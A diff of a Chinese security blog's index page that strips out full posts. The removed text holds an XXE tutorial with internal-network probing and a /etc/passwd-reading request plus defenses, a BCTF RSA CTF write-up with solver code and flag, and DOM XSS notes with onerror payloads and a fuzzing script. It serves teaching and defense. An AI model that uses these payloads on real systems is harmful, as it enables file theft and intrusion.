-<p>执行成功需要php的expect扩展</p>
-<h5 id="demo4-探测内网应用"><a href="#demo4-探测内网应用" class="headerlink" title="demo4 探测内网应用"></a>demo4 探测内网应用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM "http://192.168.1.20:80"&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
-<p>如果不存在该ip的应用，会有warning failed to open stream，通过这种方式探测内容应用<br>同时如果找到了内容应用，可以通过这种方式攻击内网应用</p>
-<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h5 id="方案一、使用开发语言提供的禁用外部实体的方法"><a href="#方案一、使用开发语言提供的禁用外部实体的方法" class="headerlink" title="方案一、使用开发语言提供的禁用外部实体的方法"></a>方案一、使用开发语言提供的禁用外部实体的方法</h5><p>1.PHP：<br>libxml_disable_entity_loader(true);<br>2.JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);<br>3.Python：<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
-<h5 id="方案二、过滤用户提交的XML数据"><a href="#方案二、过滤用户提交的XML数据" class="headerlink" title="方案二、过滤用户提交的XML数据"></a>方案二、过滤用户提交的XML数据</h5><p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>
-<h3 id="json节点的Content-Type-XXE攻击"><a href="#json节点的Content-Type-XXE攻击" class="headerlink" title="json节点的Content-Type XXE攻击"></a>json节点的Content-Type XXE攻击</h3><p>如今很多web应用程序使用的都是json格式的数据传递，通过在http request头中带入<code>Content-Type: application/json</code>表明传递的是json格式的数据。但是有时候服务器可以接受开发人员没有意料到的其他数据格式，如xml格式。如果服务器可以接受xml格式的数据，那么就有可能存在xxe。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>将如上的<code>Content-Type</code>改为xml格式的再发送<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 112</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>如果返回的数据是一样的，那么就说明服务器可以接受xml格式的数据，那么我们就可以利用xxe来攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 288</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2467</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync....</span><br></pre></td></tr></table></figure></p>
-<p>但是并不是所有的json节点都是接受xml格式的数据的。有可能返回解析错误的提示或者415不支持媒体类型的错误消息</p>
-<h4 id="带上一个xxe-cheat-sheet，DTD-Attacks"><a href="#带上一个xxe-cheat-sheet，DTD-Attacks" class="headerlink" title="带上一个xxe-cheat-sheet，DTD-Attacks"></a>带上一个<a href="http://web-in-security.blogspot.hk/2016/03/xxe-cheat-sheet.html" target="_blank" rel="external">xxe-cheat-sheet</a>，<a href="https://github.com/RUB-NDS/DTD-Attacks" target="_blank" rel="external">DTD-Attacks</a></h4><h3 id="参考security-tencent-com，91ri-org"><a href="#参考security-tencent-com，91ri-org" class="headerlink" title="参考security.tencent.com，91ri.org"></a>参考<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">security.tencent.com</a>，<a href="https://www.91ri.org/12814.html" target="_blank" rel="external">91ri.org</a></h3>
+              <h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>XML的一些基础知识，摘自<a href="https://security.tencent.com/index.php/blog/msg/69">security.tencent.com</a><br>
+          
       
     </div>
     
@@ -550,6 +405,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webVul/">webVul</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/06/28/xxe/#more">more&gt;&gt; >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -594,12 +453,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="http://blog.0kami.cn/images/bctf/specialRSA.jpg" alt="题目描述"><br>　　将附带的<a href="http://blog.0kami.cn/static/special_rsa.zip" title="zip" target="_blank" rel="external">zip</a>文件下载并解压。可以看到以下几个文件：<br>　　　　　　1. 加密算法<br>　　　　　　2. 示例密文<br>　　　　　　3. 示例明文<br>　　　　　　4. 加密的flag文件<br>　　大致我们可以看出来，题目的意图为通过示例密明文，算出加密秘钥k，然后通过k解密flag文件。阅读加解密算法，我们可以得出以下的数学公式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext</span><br><span class="line">   encode c=[(k^r%N)*m]%N</span><br><span class="line">   decode m=[(d^r%N)*c]%N</span><br><span class="line">   已知2组(m,r,c) N 的值</span><br><span class="line">   求解k</span><br></pre></td></tr></table></figure></p>
-<p>　　到这里卡了很久，一直没个正确的方式来获取k，不用数学就会忘记啊啊啊啊啊啊啊。后来求组了老师，得到了一个思路。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">下面所有^-1表示对应的乘法逆元</span><br><span class="line">   假设gcd(r1,r2)=1,那么存在a,b使得公式r1*a+r2*b=1</span><br><span class="line">   那么   k^1</span><br><span class="line">         =k^(r1*a+r2*b)</span><br><span class="line">         =k^(r1*a) * k^(r2*b)</span><br><span class="line">         =(k^r1)^a * (k^r2)^b</span><br><span class="line">而k^rn 可以通过(m,r,c)对来获得</span><br><span class="line">这里直接使用encode公式c=[(k^r%N)*m]%N</span><br><span class="line">通过推导可以得出k^r=c*(m^-1)</span><br><span class="line">m的逆元可以通过扩展欧几里德算法来求得</span><br></pre></td></tr></table></figure></p>
-<p>　　有了上面的思路，就可以写程序来加解密了，这里我用了python来写，其中(m,r,c)对我事先拿出来了，清楚一点,下面的程序是来算k的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import msgpack</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">N = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131L</span><br><span class="line"></span><br><span class="line">def Ext_Euclid (a , b ):</span><br><span class="line">        <span class="string">''</span><span class="string">'</span><br><span class="line">        扩展欧几里得算法  a*x + b*y = gcd(a,b)  返回 x,y以及a，b的最大公约数gcd</span><br><span class="line">        :param a:</span><br><span class="line">        :param b:</span><br><span class="line">        :return:x,y以及a，b的最大公约数gcd</span><br><span class="line"></span><br><span class="line">        '</span><span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> (b == 0):</span><br><span class="line">            <span class="built_in">return</span> 1 , 0 , a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x , y , q=Ext_Euclid( b , a % b )</span><br><span class="line">            x , y = y,( x - (a // b) * y )</span><br><span class="line">            <span class="built_in">return</span> x , y , q</span><br><span class="line">m1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360L</span><br><span class="line"></span><br><span class="line">c1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886L</span><br><span class="line"></span><br><span class="line">m11=RSA.inverse(m1,N)<span class="comment"># 求逆元</span></span><br><span class="line">kr1=m11*c1</span><br><span class="line"></span><br><span class="line">m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258L</span><br><span class="line"></span><br><span class="line">c2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597L</span><br><span class="line"></span><br><span class="line">m21=RSA.inverse(m2,N)</span><br><span class="line">kr2=m21*c2</span><br><span class="line"><span class="comment"># print kr2</span></span><br><span class="line"></span><br><span class="line">r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443L</span><br><span class="line"></span><br><span class="line">r2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059L</span><br><span class="line"></span><br><span class="line">a,b,_=Ext_Euclid(r1,r2)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="built_in">print</span> b</span><br><span class="line"><span class="comment"># print a*r1+b*r2</span></span><br><span class="line"></span><br><span class="line">x1=RSA.inverse(kr2,N)</span><br><span class="line">k=(pow(kr1, a,N)*pow(x1,-b,N))%N</span><br><span class="line"><span class="built_in">print</span> k</span><br></pre></td></tr></table></figure></p>
-<p>　　通过上面的程序可以算出<code>k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L</code><br>　　接下来就简单了将k带入官方的算法就可以得到flag.<br>　　 <code>BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}</code><br>　　上面程序中需要注意的是pow函数不支持指数为负数的情况，所以还要再转一下弯。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a&gt;0,b&lt;0</span><br><span class="line">(k^r)^b</span><br><span class="line">=(k^-r)^-b</span><br><span class="line">所以可以先求出k^r mod N的逆元</span><br></pre></td></tr></table></figure></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>　　数学方面的知识还是短板啊，以后得加强一下:)</p>
-
+              <h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="http://blog.0kami.cn/images/bctf/specialRSA.jpg" alt="题目描述"><br>
+          
       
     </div>
     
@@ -616,6 +471,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bctf/">bctf</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/03/20/Bctf-Crypto-SpecialRSA-writeup/#more">more&gt;&gt; >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -660,69 +519,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>　　这几天阅读了<em>《Web前端黑客技术揭秘》</em>，对DOM型的XSS进行一个总结，内容主要为书中提到的知识点，整理整理作以后复习所用。<br>　　DOM类型的XSS与反射型、存储型XSS都不同，DOM型XSS不用服务器端解析响应的参与，触发DOM型XSS可以说主要依靠浏览器客户端的解析。常见的输出点见<strong>0x04附录</strong>。</p>
-<h2 id="DOM渲染"><a href="#DOM渲染" class="headerlink" title="DOM渲染"></a>DOM渲染</h2><p>　　首先我们来理解一下HTML与Javascript自解码机制，查看以下三个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;</span><br><span class="line">2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	function HtmlEncode(str) &#123;</span><br><span class="line">		var s=&quot;&quot;;</span><br><span class="line">		if(str.length==0) return &quot;&quot;;</span><br><span class="line">		s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;);</span><br><span class="line">		s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;);</span><br><span class="line">		s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;);</span><br><span class="line">		s=str.replace(/\&quot;/g, &quot;&amp;quot;&quot;);</span><br><span class="line">		return s;</span><br><span class="line">	&#125;</span><br><span class="line">3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt;</span><br></pre></td></tr></table></figure></p>
-<p>　　对于第一种情况，很清楚，点击这个按钮后，会将<code>&lt;img src=@ onerror=alert(123) /&gt;</code>写入DOM中，并触发<code>alert(123)</code>。而第二种与第三种，<code>document.write</code>的内容都变成了<code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code>，区别在于一个是在HTML标签中,一个是通过Javascript处理后才变成这个样子的，那么这2种情况都会触发弹窗吗？答案是第二种不会，而第三种会触发。<br>　　形成这样的原因就是因为HTML与Javascript自解码机制，在HTML标签中的javascript可以进行HTML形式的编码。在HTML标签中的javascript代码会先被HTML形式的编码进行解码，即第三种情况中<code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code>在javascript运行前已经解码为<code>&lt;img src=@ onerror=alert(123) /&gt;</code>，而第二种情况为javascript运行中进行的HTML形式的编码，所以写到DOM中时直接显示在页面上。<br>HTML中的编码：</p>
-<ul>
-<li>进制编码：&#xH;(十六进制格式)、&#D;(十进制格式),最后的分号可以不要</li>
-<li>HTML实体编码：即上面的那个HtmlEncode</li>
-</ul>
-<p>　　那么同样的，在javascript上下文环境中，将内容改为javascript的编码，同样会自解码，我们来看下一个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	function $(id)&#123;return document.getElementById(id);&#125;;</span><br><span class="line">	$(&apos;exec_btn&apos;).onclick=function()&#123;</span><br><span class="line">		document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;);</span><br><span class="line">		document.write(&apos;\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0040\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0032\u0033\u0029\u0020\u002f\u003e&apos;);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
-<p>　　上面2中write出现的结果是相同的，同样的道理，由于上述编码为javascript的编码形式，并且在javascript的上下文环境中，会先进行解码，再运行javascript。<br>JavaScript中的编码：</p>
-<ul>
-<li>Unicode形式：\uH</li>
-<li>普通十六进制：\xH</li>
-<li>纯转义：\’、\”、\&lt;、>这样在特殊字符前加\进行转义</li>
-</ul>
-<p>　　通过上面几个例子，我们可以知道在HTML中与在Javascript中自动解码的差异，如果防御没有区分这样的场景，就会出现问题。<br>　　理解了上述的自解码机制，在不同的标签下会有不同的结果，比如一下几个标签会自带HtmlEncode功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;iframe&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;noscript&gt;&lt;/noscript&gt;</span><br><span class="line">&lt;noframes&gt;&lt;/noframes&gt;</span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">&lt;xmp&gt;&lt;/xmp&gt;</span><br><span class="line">&lt;plaintext&gt;&lt;/plaintext&gt;</span><br></pre></td></tr></table></figure></p>
-<p>　　<code>&lt;xmp&gt;</code>没有HtmlEncode功能，<code>&lt;plaintext&gt;</code>在Firefox下会进行HtmlEncode编码，在chrome下不会。</p>
-<h2 id="DOM-fuzzing"><a href="#DOM-fuzzing" class="headerlink" title="DOM fuzzing"></a>DOM fuzzing</h2><p>　　直接看代码把  下面的程序用python编写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def get_template(template_file):</span><br><span class="line">    &quot;&quot;&quot;获取fuzzing的模板文件内容&quot;&quot;&quot;</span><br><span class="line">    content=&apos;&apos;</span><br><span class="line">    with open(template_file) as f:</span><br><span class="line">        content=f.read()</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line">def set_result(result_file,result):</span><br><span class="line">    &quot;&quot;&quot;生成fuzzing结果文件&quot;&quot;&quot;</span><br><span class="line">    with open(result_file,&apos;w&apos;) as f:</span><br><span class="line">        f.write(result)</span><br><span class="line">def fuzzing(fuzz_file,result_file):</span><br><span class="line">    template=get_template(fuzz_file)</span><br><span class="line">    fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;)</span><br><span class="line">    fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;)</span><br><span class="line">    fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip()</span><br><span class="line">    # chars=[]</span><br><span class="line">    chars=[]</span><br><span class="line">    for i in xrange(255): # ASCII玛转换为字符</span><br><span class="line">        if i!=62:</span><br><span class="line">            chars.append(chr(i))</span><br><span class="line"></span><br><span class="line">    fuzz_area_result=&apos;&apos;</span><br><span class="line">    for c in chars: #遍历这些字符 逐一生成fuzzing内容</span><br><span class="line">        fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c)</span><br><span class="line">        fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c)))</span><br><span class="line">        fuzz_area_result+=fuzz_area_r+&apos;\n&apos;</span><br><span class="line">        print fuzz_area_r</span><br><span class="line">    result=template.replace(fuzz_area,fuzz_area_result)</span><br><span class="line">    set_result(result_file,result)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;)</span><br></pre></td></tr></table></figure></p>
-<p>　　下面为fuzz_xss_0.html的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Fuzz xss 0&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function $(x)&#123;return document.getElementById(x);&#125;</span><br><span class="line">        function f(id)&#123;</span><br><span class="line">            $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;</span><br><span class="line">&lt;code&gt;</span><br><span class="line">    &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;h3&gt;Fuzzing...&lt;/h3&gt;</span><br><span class="line">&lt;fuzz&gt;</span><br><span class="line">    &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;</span><br><span class="line">&lt;/fuzz&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>　　通过上面的fuzzing技巧，可以自行扩展</p>
-<h2 id="DOM-XSS-挖掘"><a href="#DOM-XSS-挖掘" class="headerlink" title="DOM XSS 挖掘"></a>DOM XSS 挖掘</h2><ol>
